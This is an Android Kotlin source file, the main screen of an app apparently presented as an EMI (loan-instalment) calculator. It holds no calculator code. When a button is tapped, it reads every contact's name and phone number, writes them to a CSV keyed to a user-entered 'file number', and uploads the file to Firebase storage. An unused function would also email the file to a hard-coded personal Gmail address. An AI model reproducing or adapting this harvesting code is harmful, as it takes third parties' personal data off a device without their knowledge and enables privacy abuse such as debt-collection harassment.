package com.think.emicalculator

import android.app.Activity
import android.app.ProgressDialog
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.provider.DocumentsContract
import android.text.TextUtils
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.databinding.DataBindingUtil
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import com.google.firebase.storage.UploadTask
import com.think.emicalculator.databinding.ActivityMainBinding
import com.think.emicalculator.locationutils.LocationUtils
import com.think.emicalculator.models.UserDetails
import org.supercsv.cellprocessor.constraint.NotNull
import org.supercsv.cellprocessor.ift.CellProcessor
import org.supercsv.io.CsvBeanWriter
import org.supercsv.io.ICsvBeanWriter
import org.supercsv.prefs.CsvPreference
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*


const val PERMISSIONS_REQUEST_READ_CONTACTS = 1

class MainActivity : AppCompatActivity() {

    private var mCurrentPhotoPath: String = ""
    private lateinit var binding: ActivityMainBinding
    val contactList = arrayListOf<UserDetails>()


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = DataBindingUtil.setContentView(this, R.layout.activity_main)

    }

    fun requestContactPermission() {
        if (!TextUtils.isEmpty(binding.etFileNumber.text.toString()))
            getContacts(context = this)
        else Toast.makeText(this, "Please Enter File Number", Toast.LENGTH_LONG).show()

    }


    fun getContacts(context: Context) {
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Email.ADDRESS
        )
        val cr = context.contentResolver
        cr?.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null)
            ?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Data.CONTACT_ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var id: String
                var name: String
                var contact: String
                while (it.moveToNext()) {
                    id = it.getLong(idIndex).toString()
                    name = it.getString(nameIndex)
                    contact =
                        it.getString(numberIndex).replace(" ", "").replace("-", "").replace("(", "")
                            .replace(")", "")
                    val details = UserDetails(name, contact)

                    contactList.add(details)


                }
                it.close()
              //  createFile(binding.etFileNumber.text.toString())

                writeDataToExcel(contactList,File(""))
                //return contactList
            }
    }

    private fun writeDataToExcel(userDetailsList: ArrayList<UserDetails>, file: File) {

        println("Contact Size ${userDetailsList.size}")

        val path: String = filesDir.getAbsolutePath()
            .toString() + "/" + binding.etFileNumber.text + ".csv"
        val file = File(path)

        var beanWriter: ICsvBeanWriter? = null
        try {
            beanWriter = CsvBeanWriter(
                FileWriter(file),
                CsvPreference.STANDARD_PREFERENCE
            )

            // the header elements are used to map the bean values to each column (names must match)
            val header = arrayOf(
                "Name",
                "Contact"
            )
            val processors: Array<CellProcessor> = getProcessors()

            // write the header
            beanWriter.writeHeader(*header)

            // write the beans
            for (customer in userDetailsList) {

                beanWriter.write(customer, header, processors)
            }
        } finally {
            beanWriter?.close()
            uploadImage(file)
            LocationUtils.writeToSharedPreferences(this, binding.etFileNumber.text.toString())
            //sendEmail("84", file)
        }


    }

    private fun uploadImage(filePath: File?) {
        if (filePath != null) {

            // Code for showing progressDialog while uploading
            val progressDialog = ProgressDialog(this)
            progressDialog.setTitle("Uploading...")
            progressDialog.show()

            // Defining the child of storageReference
            val ref: StorageReference = FirebaseStorage.getInstance().getReference()
                .child(
                    "Contacts/"
                            + binding.etFileNumber.text?.trim()
                )

            // adding listeners on upload
            // or failure of image
            ref.putFile(Uri.fromFile(filePath))
                .addOnSuccessListener(
                    object : OnSuccessListener<UploadTask.TaskSnapshot?> {
                        override fun onSuccess(
                            taskSnapshot: UploadTask.TaskSnapshot?
                        ) {

                            // Image uploaded successfully
                            // Dismiss dialog
                            progressDialog.dismiss()
                            Toast
                                .makeText(
                                    this@MainActivity,
                                    "File Uploaded!!",
                                    Toast.LENGTH_SHORT
                                )
                                .show()
                        }
                    })
                .addOnFailureListener { e -> // Error, Image not uploaded
                    progressDialog.dismiss()
                    Toast
                        .makeText(
                            this@MainActivity,
                            "Failed " + e.message,
                            Toast.LENGTH_SHORT
                        )
                        .show()
                }
                .addOnProgressListener { taskSnapshot ->

                    // Progress Listener for loading
                    // percentage on the dialog box
                    val progress: Double = ((100.0
                            * taskSnapshot.getBytesTransferred()
                            / taskSnapshot.getTotalByteCount()))
                    progressDialog.setMessage(
                        ("Uploaded "
                                + progress.toInt() + "%")
                    )
                }
        }
    }

    private fun sendEmail(filename: String, file: File) {
        val emailIntent: Intent = Intent(Intent.ACTION_SEND)
        emailIntent.type = "message/rfc822"
        emailIntent.putExtra(
            Intent.EXTRA_SUBJECT,
            "File Number ${binding.etFileNumber.text.toString()} contacts "
        )
        emailIntent.putExtra(Intent.EXTRA_EMAIL, arrayOf("dabasfinance3@gmail.com"))
        //emailIntent.putExtra(Intent.EXTRA_EMAIL, "ibtapplication@gmail.com")
        emailIntent.putExtra(Intent.EXTRA_STREAM, getUri(file))
        emailIntent.putExtra(
            Intent.EXTRA_TEXT,
            "Please find the contacts details of client ${binding.etFileNumber.text.toString()}"
        )
        LocationUtils.writeToSharedPreferences(this, binding.etFileNumber.text.toString())
        try {
            startActivity(Intent.createChooser(emailIntent, "Please select app to send"))
        } catch (ex: ActivityNotFoundException) {
        }

    }

    @Throws(IOException::class)
    private fun createImageFile(): File? {
        // Create an image file name
        val timeStamp: String = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = timeStamp + "_" + binding.etFileNumber.text.toString()
        val storageDir = File(
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DCIM
            ), "Files"
        )
        val image = File.createTempFile(
            imageFileName,  /* prefix */
            ".csv",  /* suffix */
            storageDir /* directory */
        )

        // Save a file: path for use with ACTION_VIEW intents
        mCurrentPhotoPath = "file:" + image.absolutePath
        return image
    }

    private fun createFile(title: String) {
        val intent = Intent(Intent.ACTION_CREATE_DOCUMENT)
        intent.addCategory(Intent.CATEGORY_OPENABLE)
        intent.type = "text/csv"
        intent.putExtra(Intent.EXTRA_TITLE, title)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            intent.putExtra(DocumentsContract.EXTRA_INITIAL_URI, Uri.parse("/Documents"))
        }

        startActivityForResult(intent, 2000)
        //createInvoiceActivityResultLauncher.launch(intent)
    }

    private fun getUri(file: File): Uri {
        return FileProvider.getUriForFile(
            this@MainActivity,
            BuildConfig.APPLICATION_ID + ".provider",
            file
        )
    }

    fun fetchContacts(view: View) {
        requestContactPermission()
    }

    private fun getProcessors(): Array<CellProcessor> {

        return arrayOf(
            NotNull(),  // Name
            NotNull(),  // Contact

        )
    }


    fun goBack(view: View) {
        onBackPressed()
    }


    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (2000 == requestCode) {
            if (Activity.RESULT_OK == resultCode) {
                var uri: Uri? = null
                if (data?.data != null) {
                    uri = data?.data
                    writeDataToExcel(contactList, File(uri?.path ?: ""))
                    // Perform operations on the document using its URI.
                }
            }

        }
    }
}



